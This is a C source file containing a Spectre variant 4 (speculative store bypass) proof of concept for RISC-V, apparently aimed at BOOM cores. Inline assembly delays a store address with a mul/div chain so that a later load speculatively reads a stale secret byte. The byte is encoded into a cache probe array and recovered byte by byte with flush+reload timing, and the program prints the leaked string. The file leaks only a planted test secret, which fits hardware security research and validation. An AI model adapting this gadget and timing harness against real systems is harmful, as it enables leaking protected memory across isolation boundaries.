#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include "rv64_spectre.h"

#ifndef V4_ROUNDS
#define V4_ROUNDS 128
#endif

#ifndef V4_GADGET_MODE
#define V4_GADGET_MODE 0
#endif

static char data[256];
static uint8_t *channel;
static const char secret[] = "S3CreT";
static const char overwrite = '#';

extern void boom_v4_store_bypass_probe(uint8_t *data_ptr, uint8_t *probe,
                                       uint8_t secret_value, uint8_t overwrite_value);

#if V4_GADGET_MODE == 1
static __attribute__((noinline)) void boom_v4_store_bypass_probe_inline(uint8_t *data_ptr,
                                                                        uint8_t *probe,
                                                                        uint8_t secret_value,
                                                                        uint8_t overwrite_value)
{
  uintptr_t slow_addr;
  uintptr_t probe_addr;
  uintptr_t scratch;

  asm volatile(
      "sb    %[secret], 0(%[data])\n"
      "fence rw, rw\n"
      "mv    %[slow_addr], %[data]\n"
      "li    %[scratch], 6\n"
      "mul   %[slow_addr], %[slow_addr], %[scratch]\n"
      "div   %[slow_addr], %[slow_addr], %[scratch]\n"
      "mul   %[slow_addr], %[slow_addr], %[scratch]\n"
      "div   %[slow_addr], %[slow_addr], %[scratch]\n"
      "mul   %[slow_addr], %[slow_addr], %[scratch]\n"
      "div   %[slow_addr], %[slow_addr], %[scratch]\n"
      "sb    %[overwrite], 0(%[slow_addr])\n"
      "lbu   %[probe_addr], 0(%[data])\n"
      "slli  %[probe_addr], %[probe_addr], 6\n"
      "add   %[probe_addr], %[probe], %[probe_addr]\n"
      "lbu   %[scratch], 0(%[probe_addr])\n"
      : [slow_addr] "=&r"(slow_addr),
        [probe_addr] "=&r"(probe_addr),
        [scratch] "=&r"(scratch)
      : [data] "r"(data_ptr),
        [probe] "r"(probe),
        [secret] "r"(secret_value),
        [overwrite] "r"(overwrite_value)
      : "memory");
}
#endif

static __attribute__((noinline)) void read_byte(size_t index, uint8_t result[2],
                                                uint64_t score[2], uint64_t threshold)
{
  uint64_t hits[PROBE_ENTRIES];
  memset(hits, 0, sizeof(hits));

  for (int round = V4_ROUNDS; round > 0; --round)
  {
    data[index] = (char)secret[index];
    flush_range(channel, PROBE_BYTES);
    flush_line(&data[index]);
    fence_all();
#if V4_GADGET_MODE == 1
    boom_v4_store_bypass_probe_inline((uint8_t *)&data[index], channel,
                                      (uint8_t)secret[index], (uint8_t)overwrite);
#else
    boom_v4_store_bypass_probe((uint8_t *)&data[index], channel,
                               (uint8_t)secret[index], (uint8_t)overwrite);
#endif

    for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    {
      const size_t mix_i = probe_mix(i);
      volatile uint8_t *addr = &channel[mix_i * PROBE_STRIDE];
      const uint64_t elapsed = probe_time(addr);
      if (elapsed <= threshold)
        hits[mix_i]++;
    }
  }

  top_two_idx(hits, PROBE_ENTRIES, result, score);
}

int main(void)
{
  uint8_t result[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  const size_t len = spectre_limit_len(sizeof(secret) - 1u);
  char leaked[sizeof(secret)];

  memset(data, 0, sizeof(data));
  if (spectre_runtime_init() != 0)
    return 1;
  channel = (uint8_t *)spectre_alloc_aligned(PROBE_BYTES, L1_BLOCK_SZ_BYTES);
  if (channel == NULL)
    return 1;

  probe_init(channel);
  memset(leaked, 0, sizeof(leaked));

  const uint64_t threshold = calibrate_probe_threshold(channel);
  printf("[v4] threshold: %lu\n", (unsigned long)threshold);
#if V4_GADGET_MODE == 1
  printf("[v4] gadget: inline\n");
#endif
  printf("[v4] reading %lu bytes\n", (unsigned long)len);

  for (size_t i = 0; i < len; ++i)
  {
    read_byte(i, result, score, threshold);
    leaked[i] = (char)result[0];
    printf("[v4] byte %2lu: %c (0x%02x) score=%lu\n",
           (unsigned long)i,
           (result[0] >= 32 && result[0] < 127) ? result[0] : '?',
           result[0],
           (unsigned long)score[0]);
    printf("[v4] expected: %c (0x%02x) second=%c (0x%02x) score=%lu\n",
           (secret[i] >= 32 && secret[i] < 127) ? secret[i] : '?',
           (uint8_t)secret[i],
           (result[1] >= 32 && result[1] < 127) ? result[1] : '?',
           result[1],
           (unsigned long)score[1]);
    printf("[v4] check %lu 0x%02x 0x%02x\n",
           (unsigned long)i,
           result[0],
           (uint8_t)secret[i]);
  }

  printf("[v4] leaked: %s\n", leaked);
  return 0;
}
